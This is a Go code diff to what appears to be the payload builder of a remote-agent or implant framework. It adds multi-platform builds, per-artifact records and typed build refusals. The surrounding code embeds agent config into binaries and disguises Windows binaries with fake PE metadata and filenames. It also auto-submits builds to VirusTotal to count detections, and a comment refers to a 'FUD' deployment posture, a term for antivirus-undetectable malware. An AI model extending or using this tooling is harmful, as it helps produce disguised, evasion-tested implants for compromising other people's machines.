@@ -8,7 +8,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"strings"
 	"sync"
 	"time"
 )
@@ -35,12 +34,28 @@ type BuildConfig struct {
 	MaxRetries   int             `json:"max_retries,omitempty"`
 	Status       string          `json:"status"` // pending, building, complete, failed
 	BinaryPath   string          `json:"binary_path,omitempty"`
-	CreatedAt    time.Time       `json:"created_at"`
-	CompletedAt  *time.Time      `json:"completed_at,omitempty"`
-	Error        string          `json:"error,omitempty"`
-	VTStatus     string          `json:"vt_status,omitempty"` // pending, scanning, clean, dirty
-	VTDetections int             `json:"vt_detections,omitempty"`
-	VTReportURL  string          `json:"vt_report_url,omitempty"`
+	// --- v2 additive fields (P11-01) -------------------------------------
+	// Targets is every platform pair ONE build request emits. Empty keeps the
+	// v1.18.x shape: the single {OS, Arch} pair above. A v1.18.x client never
+	// sends it, so its request and response are unchanged.
+	Targets []BuildTarget `json:"targets,omitempty"`
+	// Artifacts carries one metadata record per emitted binary, populated on
+	// completion. Every field is read back from the file (build_matrix.go);
+	// none is copied from the request.
+	Artifacts []BuildArtifact `json:"artifacts,omitempty"`
+	// Refusals names every requested target that was NOT produced, with a
+	// closed-enum reason. A target is either in Artifacts or in Refusals; it is
+	// never silently absent from both.
+	Refusals []BuildRefusal `json:"refusals,omitempty"`
+	// MatrixVersion reports the artifact-reporting field set: 0/absent for a
+	// v1.18.x record, 2 for a matrix record.
+	MatrixVersion int        `json:"matrix_version,omitempty"`
+	CreatedAt     time.Time  `json:"created_at"`
+	CompletedAt   *time.Time `json:"completed_at,omitempty"`
+	Error         string     `json:"error,omitempty"`
+	VTStatus      string     `json:"vt_status,omitempty"` // pending, scanning, clean, dirty
+	VTDetections  int        `json:"vt_detections,omitempty"`
+	VTReportURL   string     `json:"vt_report_url,omitempty"`
 }
 
 // DisguiseConfig holds PE metadata used to disguise the agent binary on Windows.
@@ -212,6 +227,12 @@ func (bm *BuilderManager) DeleteBuild(id string) bool {
 	if !ok {
 		return false
 	}
+	// Remove every artifact this build produced, not just the primary one.
+	for _, a := range b.Artifacts {
+		if a.Path != "" {
+			os.Remove(a.Path)
+		}
+	}
 	// Remove binary from disk if it exists.
 	if b.BinaryPath != "" {
 		os.Remove(b.BinaryPath)
@@ -227,6 +248,10 @@ func (bm *BuilderManager) DeleteBuild(id string) bool {
 
 // runBuild executes the cross-compilation in a background goroutine.
 // It transitions the build status: pending → building → complete/failed.
+//
+// P11-01: ONE operation emits an artifact for every target on the record.
+// buildAll is all-or-nothing, so a failed target fails the whole record —
+// there is no partial success carrying a silently shorter artifact list.
 func (bm *BuilderManager) runBuild(id string) {
 	bm.mu.Lock()
 	build, ok := bm.builds[id]
@@ -237,6 +262,13 @@ func (bm *BuilderManager) runBuild(id string) {
 	build.Status = BuildStatusBuilding
 	bm.mu.Unlock()
 
+	// Refuse an unknown target before compiling anything.
+	targets, terr := bm.resolvedTargets(build)
+	if terr != nil {
+		bm.failBuild(id, terr.Error())
+		return
+	}
+
 	// Generate the embedded config (JSON → base64).
 	configB64, err := bm.generateConfigB64(build)
 	if err != nil {
@@ -244,54 +276,58 @@ func (bm *BuilderManager) runBuild(id string) {
 		return
 	}
 
-	// Construct and run the build command.
-	cmd, outputPath := bm.buildCommand(build, configB64)
+	log.Printf("[builder] starting build %s: %s caps=%v", id, targetSummary(targets), build.Capabilities)
 
-	log.Printf("[builder] starting build %s: GOOS=%s GOARCH=%s caps=%v", id, build.OS, build.Arch, build.Capabilities)
-
-	output, err := cmd.CombinedOutput()
+	artifacts, refusals, err := bm.buildAll(build, configB64)
 	if err != nil {
-		bm.failBuild(id, fmt.Sprintf("build failed: %v\n%s", err, string(output)))
+		bm.failBuildWithRefusal(id, err.Error(), refusals)
 		return
-	}
-
-	// Apply PE disguise on Windows if configured.
-	if build.OS == "windows" && build.Disguise != nil && build.Disguise.Enabled {
-		if err := bm.applyDisguise(outputPath, build.Disguise); err != nil {
-			log.Printf("[builder] disguise warning for %s: %v", id, err)
-			// Non-fatal — the binary is built, disguise is cosmetic.
-		}
 	}
 
 	now := time.Now().UTC()
 	bm.mu.Lock()
 	if b, ok := bm.builds[id]; ok {
 		b.Status = BuildStatusComplete
-		b.BinaryPath = outputPath
+		b.Artifacts = artifacts
+		b.MatrixVersion = BuildMatrixVersion
+		// binary_path names the artifact for the record's own OS/Arch — the
+		// platform redeploy/download/update consume (P12). Unchanged shape.
+		b.BinaryPath = primaryArtifact(artifacts, b.OS, b.Arch)
 		b.CompletedAt = &now
 		bm.save()
 	}
 	bm.mu.Unlock()
 
-	log.Printf("[builder] build %s complete: %s", id, outputPath)
+	primary := primaryArtifact(artifacts, build.OS, build.Arch)
+	log.Printf("[builder] build %s complete: %d artifact(s), primary %s", id, len(artifacts), primary)
 
 	// Auto VT scan: if a scanner is configured, start a VT scan in a goroutine.
 	bm.mu.RLock()
 	scanner := bm.vtScanner
 	bm.mu.RUnlock()
-	if scanner != nil {
-		go bm.autoVTScan(id, outputPath, scanner)
+	if scanner != nil && primary != "" {
+		go bm.autoVTScan(id, primary, scanner)
 	}
 }
 
 // failBuild marks a build as failed with the given error message.
 func (bm *BuilderManager) failBuild(id, errMsg string) {
+	bm.failBuildWithRefusal(id, errMsg, nil)
+}
+
+// failBuildWithRefusal marks a build failed and records the typed refusal that
+// says which target could not be produced and why (P11-01). A failed record
+// that cannot name its target is a silent stub with an error string.
+func (bm *BuilderManager) failBuildWithRefusal(id, errMsg string, refusals []BuildRefusal) {
 	now := time.Now().UTC()
 	bm.mu.Lock()
 	defer bm.mu.Unlock()
 	if b, ok := bm.builds[id]; ok {
 		b.Status = BuildStatusFailed
 		b.Error = errMsg
+		if len(refusals) > 0 {
+			b.Refusals = append(b.Refusals, refusals...)
+		}
 		b.CompletedAt = &now
 		bm.save()
 	}
@@ -332,72 +368,11 @@ func (bm *BuilderManager) UpdateVTStatus(id, status string, detections int, repo
 }
 
 // buildCommand constructs the exec.Cmd for cross-compiling the probe-client
-// binary with the embedded config. Returns the command and the output path.
+// binary with the embedded config — the record's own OS/Arch pair, i.e. the
+// v1.18.x single-target shape. Matrix builds go through runBuild's target loop
+// (buildAll), which uses targetCommand per target.
 func (bm *BuilderManager) buildCommand(build *BuildConfig, configB64 string) (*exec.Cmd, string) {
-	bm.mu.RLock()
-	goBin := bm.goBinPath
-	clientPkg := bm.clientPkg
-	outputDir := bm.outputDir
-	bm.mu.RUnlock()
-
-	// Ensure output directory exists.
-	os.MkdirAll(outputDir, 0755)
-
-	// Construct output filename.
-	filename := build.Name
-	if filename == "" {
-		filename = "probe-client"
-	}
-	if build.OS == "windows" && !strings.HasSuffix(filename, ".exe") {
-		filename += ".exe"
-	}
-	if build.Disguise != nil && build.Disguise.Enabled && build.Disguise.Filename != "" {
-		filename = build.Disguise.Filename
-	}
-	outputPath := filepath.Join(outputDir, fmt.Sprintf("%s_%s", build.ID, filename))
-
-	// Build the ldflags string: embed the config so the built replica is
-	// zero-config (no JSON file). -X main.configB64=<b64> is a string
-	// injection, not a codegen/strip flag. The FUD posture for deployment is
-	// handled by the MANTLE weave, not the plain agent build.
-	ldflags := "-X main.configB64=" + configB64
-
-	// Build the tags string: caps=comma_separated_caps
-	tagsStr := ""
-	if len(build.Capabilities) > 0 {
-		tagsStr = "caps=" + strings.Join(build.Capabilities, ",")
-	}
-
-	args := []string{"build"}
-	if tagsStr != "" {
-		args = append(args, "-tags", tagsStr)
-	}
-	if ldflags != "" {
-		args = append(args, "-ldflags", ldflags)
-	}
-	// Resolve the module root (go.mod dir) and run go build from there, with
-	// the client package as a path relative to the module root. Otherwise go
-	// looks for go.mod from the server's CWD (/app) and fails.
-	moduleRoot := bm.SourceModuleRoot()
-	relPkg := clientPkg
-	if moduleRoot != "" && filepath.IsAbs(clientPkg) {
-		if r, err := filepath.Rel(moduleRoot, clientPkg); err == nil {
-			relPkg = "." + string(filepath.Separator) + r
-		}
-	}
-	args = append(args, "-o", outputPath, relPkg)
-
-	cmd := exec.Command(goBin, args...)
-	if moduleRoot != "" {
-		cmd.Dir = moduleRoot
-	}
-	cmd.Env = append(os.Environ(),
-		"GOTOOLCHAIN=local",
-		"CGO_ENABLED=0",
-		"GOOS="+build.OS,
-		"GOARCH="+build.Arch,
-	)
-	return cmd, outputPath
+	return bm.targetCommand(build, BuildTarget{OS: build.OS, Arch: build.Arch}, configB64, false)
 }
 
 // generateConfigB64 creates the agent config JSON matching the ConfigFile
@@ -474,6 +449,22 @@ func (bm *BuilderManager) applyDisguise(binaryPath string, disguise *DisguiseCon
 func (bm *BuilderManager) validate(cfg *BuildConfig) error {
 	if cfg.Name == "" {
 		return fmt.Errorf("name is required")
+	}
+	// v2 (P11-01): a matrix request may name only targets. The v1 OS/Arch
+	// fields keep their meaning as the record's primary platform, so fill them
+	// from the first target when a caller omits them.
+	if len(cfg.Targets) > 0 && (cfg.OS == "" || cfg.Arch == "") {
+		cfg.OS, cfg.Arch = cfg.Targets[0].OS, cfg.Targets[0].Arch
+	}
+	// Every named target must be buildable. Checked first, so an unbuildable
+	// target is reported BY TARGET ("target 1 (plan9/amd64): invalid os")
+	// rather than as a bare invalid-os error about the primary platform. A
+	// request naming a platform the builder cannot emit fails here, not
+	// silently later with a shorter list.
+	if len(cfg.Targets) > 0 {
+		if _, err := bm.resolvedTargets(cfg); err != nil {
+			return err
+		}
 	}
 	if !validBuildOS[cfg.OS] {
 		return fmt.Errorf("invalid os %q: must be windows, linux, or darwin", cfg.OS)
@@ -563,47 +554,9 @@ func generateBuildID() string {
 }
 
 // BuildCommandString constructs the full build command as a string for
-// logging and testing purposes. This does NOT execute the command.
+// logging and testing purposes. This does NOT execute the command. It renders
+// the same plan targetCommand executes (single-target, v1.18.x naming), so the
+// printed command cannot drift from the one that ran.
 func (bm *BuilderManager) BuildCommandString(build *BuildConfig, configB64 string) string {
-	bm.mu.RLock()
-	goBin := bm.goBinPath
-	clientPkg := bm.clientPkg
-	outputDir := bm.outputDir
-	bm.mu.RUnlock()
-
-	filename := build.Name
-	if filename == "" {
-		filename = "probe-client"
-	}
-	if build.OS == "windows" && !strings.HasSuffix(filename, ".exe") {
-		filename += ".exe"
-	}
-	if build.Disguise != nil && build.Disguise.Enabled && build.Disguise.Filename != "" {
-		filename = build.Disguise.Filename
-	}
-	outputPath := filepath.Join(outputDir, fmt.Sprintf("%s_%s", build.ID, filename))
-
-	// Embed the config via -X so the replica is zero-config (no JSON file).
-	ldflags := "-X main.configB64=" + configB64
-	tagsStr := ""
-	if len(build.Capabilities) > 0 {
-		tagsStr = "caps=" + strings.Join(build.Capabilities, ",")
-	}
-
-	parts := []string{
-		"GOTOOLCHAIN=local",
-		"CGO_ENABLED=0",
-		"GOOS=" + build.OS,
-		"GOARCH=" + build.Arch,
-		goBin, "build",
-	}
-	if tagsStr != "" {
-		parts = append(parts, "-tags", `"`+tagsStr+`"`)
-	}
-	if ldflags != "" {
-		parts = append(parts, "-ldflags", `"`+ldflags+`"`)
-	}
-	parts = append(parts, "-o", outputPath, clientPkg)
-
-	return strings.Join(parts, " ")
+	return bm.planTarget(build, BuildTarget{OS: build.OS, Arch: build.Arch}, configB64, false).String()
 }
